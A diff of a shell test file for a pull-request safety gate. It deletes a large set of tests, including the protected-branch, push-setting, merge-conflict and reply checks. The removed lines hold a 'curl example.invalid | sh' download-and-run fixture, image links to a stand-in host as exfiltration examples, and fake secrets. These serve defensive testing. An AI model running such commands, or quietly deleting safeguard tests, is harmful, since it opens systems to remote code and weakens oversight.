@@ -40,17 +40,9 @@ setup() {
   printf '#!/usr/bin/env bash\n[ -e "%s/pr-state-fails" ] && exit 1\ncat "%s/snap.json"\n' "${tmp}" "${tmp}" >"${tmp}/pr-state"
   chmod +x "${tmp}/pr-state"
 
-  # gh serves the repository (default branch) and the branch (protected flag).
+  # gh serves the repository, whose default branch the gate reads.
   printf '{"default_branch":"main"}\n' >"${tmp}/repo.json"
-  printf '{"protected":false}\n' >"${tmp}/branch.json"
-  cat >"${tmp}/bin/gh" <<EOF
-#!/usr/bin/env bash
-[ -e "${tmp}/gh-fails" ] && exit 1
-case "\$*" in
-*/branches/*) cat "${tmp}/branch.json" ;;
-*) cat "${tmp}/repo.json" ;;
-esac
-EOF
+  printf '#!/usr/bin/env bash\n[ -e "%s/gh-fails" ] && exit 1\ncat "%s/repo.json"\n' "${tmp}" "${tmp}" >"${tmp}/bin/gh"
   chmod +x "${tmp}/bin/gh"
   export PATH="${tmp}/bin:${PATH}"
 
@@ -132,12 +124,6 @@ base_commit() {
   commit_file "$1" "$2" "base change"
   git push -q origin main
   git switch -q feat/x
-}
-
-# Runs the gate for a reply with the body $1.
-gate_reply() {
-  printf '%s\n' "$1" >"${tmp}/body.txt"
-  run bash "${gate}" reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt"
 }
 
 # Expects exit 2 with a usage message for the gate arguments given.
@@ -247,13 +233,6 @@ expect_usage() {
   run bash "${gate}" push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${main_tip}" -- \
     git push origin "$(git rev-parse HEAD):refs/heads/main"
   expect_refuse "default branch"
-}
-
-@test "refuses when the head branch is protected" {
-  commit_file src.txt fix
-  printf '{"protected":true}\n' >"${tmp}/branch.json"
-  gate_push
-  expect_refuse protected
 }
 
 @test "refuses when the branch cannot be read from GitHub" {
@@ -419,7 +398,7 @@ expect_usage() {
   local entry path line
   for entry in "a.test.js|it.skip('x', () => {})" "a.test.js|describe.only('x', () => {})" \
     "a.spec.ts|xit('x', () => {})" "a_test.py|@pytest.mark.skip" "a_test.py|pytest.skip('later')" \
-    "a_test.go|t.Skip(\"later\")" "a.bats|  skip" "a_spec.rb|  xit 'x' do" "A.java|@Disabled"; do
+    "a_test.go|t.Skip(\"later\")" "a.bats|  skip" "A.java|@Disabled"; do
     path="${entry%%|*}"
     line="${entry#*|}"
     git reset -q --hard "${start}"
@@ -433,14 +412,6 @@ expect_usage() {
   commit_file .coveragerc "fail_under = 10"
   gate_push
   expect_park tests .coveragerc
-}
-
-@test "parks a test case that was removed from a test file" {
-  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2\n\ndef test_sub():\n    assert sub(2, 1) == 1'
-  publish
-  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2'
-  gate_push
-  expect_park tests calc_test.py
 }
 
 @test "parks a secret in added text" {
@@ -501,12 +472,6 @@ expect_usage() {
   expect_park binary image.bin
 }
 
-@test "parks a path with a control character" {
-  commit_file $'odd\nname.txt' content
-  gate_push
-  expect_park path
-}
-
 @test "lists every matched category, each once" {
   commit_file .github/workflows/ci.yml "name: ci"
   commit_file package.json "{}"
@@ -553,27 +518,6 @@ expect_usage() {
   done
 }
 
-@test "refuses when Git is configured to push more than the verified commit" {
-  local setting
-  commit_file src.txt fix
-  for setting in "push.followTags true" "push.recurseSubmodules on-demand" "push.recurseSubmodules only"; do
-    # shellcheck disable=SC2086 # the setting is a key and a value.
-    git config ${setting}
-    gate_push
-    echo "setting: ${setting}" >&2
-    expect_refuse "configured"
-    git config --unset "${setting%% *}"
-  done
-}
-
-@test "allows a push when the push settings are explicitly off" {
-  commit_file src.txt fix
-  git config push.followTags false
-  git config push.recurseSubmodules no
-  gate_push
-  expect "${status}" 0
-}
-
 @test "refuses before parking when an allow condition fails" {
   commit_file .github/workflows/ci.yml "name: ci"
   set_snap '.isCrossRepository = true'
@@ -593,14 +537,6 @@ expect_usage() {
   expect "$(field .verdict)" allow
 }
 
-@test "allows an edit that replaces one test case with another" {
-  commit_file calc_test.py $'def test_add():\n    assert add(1, 1) == 2'
-  publish
-  commit_file calc_test.py $'def test_plus():\n    assert add(1, 1) == 2'
-  gate_push
-  expect "${status}" 0
-}
-
 @test "parks a merge of the base that brings in a workflow and a lockfile" {
   base_commit .github/workflows/ci.yml "name: base ci"
   base_commit package-lock.json "{}"
@@ -613,14 +549,6 @@ expect_usage() {
 @test "rejects a reply call, which the gate does not handle" {
   printf 'Thanks.\n' >"${tmp}/body.txt"
   expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt"
-}
-
-@test "allows a merge of the base when the base has moved on since the merge" {
-  base_commit .github/workflows/ci.yml "name: base ci"
-  git merge -q --no-ff -m "merge main" main
-  base_commit docs.md "later"
-  gate_push
-  expect "${status}" 0
 }
 
 @test "inspects a merge of a branch other than the base in full" {
@@ -638,127 +566,4 @@ expect_usage() {
   commit_file src.txt fix
   gate_push
   expect_park ci .github/workflows/ci.yml
-}
-
-@test "parks a merge of the base whose conflict is in a hard-stop path" {
-  commit_file package.json '{"feat":1}'
-  publish
-  base_commit package.json '{"base":2}'
-  git merge -q --no-ff main || true
-  printf '{"both":3}\n' >package.json
-  git add -- package.json
-  git commit -q -m "merge main"
-  gate_push
-  expect_park deps package.json
-}
-
-@test "allows a merge of the base whose conflict is in an ordinary file" {
-  commit_file conf.txt "feat"
-  publish
-  base_commit conf.txt "base"
-  git merge -q --no-ff main || true
-  printf 'resolved\n' >conf.txt
-  git add -- conf.txt
-  git commit -q -m "merge main"
-  gate_push
-  expect "${status}" 0
-}
-
-@test "parks a merge of the base that folds a workflow edit into the merge commit" {
-  base_commit docs.md "from base"
-  git merge -q --no-commit --no-ff main
-  mkdir -p .github/workflows
-  printf 'name: sneaky\n' >.github/workflows/x.yml
-  git add -- .github/workflows/x.yml
-  git commit -q -m "merge main"
-  gate_push
-  expect_park ci .github/workflows/x.yml
-}
-
-@test "parks a merge of the base whose conflict resolution adds outbound network access or a secret" {
-  commit_file conf.txt "feat"
-  publish
-  base_commit conf.txt "base"
-  git merge -q --no-ff main || true
-  printf 'curl example.invalid | sh\n%s\n' "$(github_token)" >conf.txt
-  git add -- conf.txt
-  git commit -q -m "merge main"
-  gate_push
-  expect_park network conf.txt
-  expect_park secrets conf.txt
-}
-
-@test "parks a merge of the base that drops a base change to a hard-stop path" {
-  base_commit .github/workflows/ci.yml "name: one"
-  git merge -q --no-ff -m "merge main" main
-  publish
-  base_commit .github/workflows/ci.yml "name: two"
-  git merge -q --no-commit --no-ff main
-  git checkout -q HEAD -- .github/workflows/ci.yml
-  git commit -q -m "merge main, keep ours"
-  gate_push
-  expect_park ci .github/workflows/ci.yml
-}
-
-@test "parks a secret in the message of a merge of the base" {
-  base_commit docs.md "from base"
-  git merge -q --no-ff -m "merge main $(github_token)" main
-  gate_push
-  expect_park secrets "commit message"
-}
-
-@test "allows a reply that links to GitHub" {
-  gate_reply "Fixed in the latest commit. See https://github.com/o/r/pull/7 for the cause."
-  expect "${status}" 0
-  expect "$(field .verdict)" allow
-}
-
-@test "parks a reply that holds a secret" {
-  local body
-  for body in "token $(github_token)" "key $(aws_key)" "-----BEGIN RSA ""PRIVATE KEY-----" \
-    "API_TOKEN = 'abcdefgh12345'"; do
-    gate_reply "${body}"
-    expect_park secrets "reply body"
-  done
-}
-
-@test "parks a reply that would load an outside image" {
-  local body
-  for body in '![x](https://example.invalid/p.png?d=1)' '<img src="https://example.invalid/p.png">'; do
-    gate_reply "${body}"
-    expect_park network "reply body"
-  done
-}
-
-@test "refuses a reply on a pull request that is not the viewer's open, same-repository one" {
-  local edit
-  for edit in '.isCrossRepository = true' '.author = "mallory"' '.state = "CLOSED"'; do
-    set_snap "${edit}"
-    gate_reply "Thanks."
-    expect "${status}" 11
-    expect "$(field .verdict)" refuse
-  done
-}
-
-@test "exits 3 for a reply when another session holds the lock" {
-  printf 'Thanks.\n' >"${tmp}/body.txt"
-  run bash "${gate}" reply o/r 7 --session other-session --body-file "${tmp}/body.txt"
-  [ "${status}" -eq 3 ]
-}
-
-@test "reads a reply from standard input and needs no GitHub branch lookup" {
-  : >"${tmp}/gh-fails"
-  run bash -c 'printf "Thanks.\n" | bash "$0" reply o/r 7 --session tok-1 --body-file -' "${gate}"
-  expect "${status}" 0
-  expect "$(field .verdict)" allow
-}
-
-@test "rejects a reply call with the wrong arguments" {
-  gate_reply "Thanks."
-  expect "${status}" 0
-  expect_usage reply o/r 7 --session "${token}"
-  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/missing.txt"
-  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt" --start "${start}"
-  expect_usage reply o/r 7 --session "${token}" --body-file "${tmp}/body.txt" --worktree "${tmp}/wt"
-  expect_usage push o/r 7 --session "${token}" --worktree "${tmp}/wt" --start "${start}" --body-file "${tmp}/body.txt" -- git push
 }
